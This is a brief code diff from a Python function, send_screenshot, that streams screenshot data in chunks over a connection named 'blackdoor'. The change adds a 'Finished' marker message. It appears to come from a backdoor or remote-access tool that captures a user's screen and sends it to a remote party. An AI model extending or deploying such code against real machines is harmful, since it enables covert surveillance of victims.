@@ -37,7 +37,7 @@ def send_screenshot(blackdoor):
     while package:
         blackdoor.send(package)
         package = buffered.read(1024)
-
+    blackdoor.send(str.encode('Finished'))
     print("sending finished")
 
 
